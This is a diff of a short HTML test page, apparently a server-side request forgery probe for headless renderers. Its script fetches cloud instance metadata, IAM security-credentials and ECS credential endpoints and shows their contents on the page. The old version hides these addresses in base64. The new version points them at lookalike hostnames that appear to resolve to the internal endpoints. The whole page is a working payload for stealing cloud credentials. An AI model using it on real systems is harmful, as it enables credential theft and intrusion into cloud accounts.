@@ -2,23 +2,17 @@
 <html>
 <head><title>T</title></head>
 <body>
-<h1>Test Page</h1>
+<h1>DNS Test</h1>
 <div id="j">JS_NOT_EXECUTED</div>
 <div id="r1">WAITING</div>
 <div id="r2">WAITING</div>
 <div id="r3">WAITING</div>
-<div id="r4">WAITING</div>
 <script>
-document.getElementById('j').textContent='JS_EXECUTED_49';
-var a=atob('aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=');
-var b=atob('bGF0ZXN0L21ldGEtZGF0YS8=');
-var c=atob('bGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMv');
-var d=atob('aHR0cDovLzE2OS4yNTQuMTcwLjIv');
-function f(u,e,l){var x=new XMLHttpRequest();x.open('GET',u,false);try{x.send();document.getElementById(e).textContent=l+':'+x.status+' '+x.responseText.substring(0,3000);}catch(r){document.getElementById(e).textContent=l+'_ERR:'+r.message;}}
-f(a+b,'r1','MD');
-f(a+c,'r2','IAM');
-f(d,'r3','ECS');
-f(atob('aHR0cDovLzEyNy4wLjAuMS8='),'r4','LO');
+document.getElementById("j").textContent="JS_EXECUTED_49";
+function f(u,e,l){var x=new XMLHttpRequest();x.open("GET",u,false);try{x.send();document.getElementById(e).textContent=l+":S"+x.status+" "+x.responseText.substring(0,3000);}catch(r){document.getElementById(e).textContent=l+"_ERR:"+r.message;}}
+f("http://imds.xctfassets.net/latest/meta-data/","r1","MD");
+f("http://imds.xctfassets.net/latest/meta-data/iam/security-credentials/","r2","IAM");
+f("http://ecs.xctfassets.net/","r3","ECS");
 </script>
 </body>
 </html>
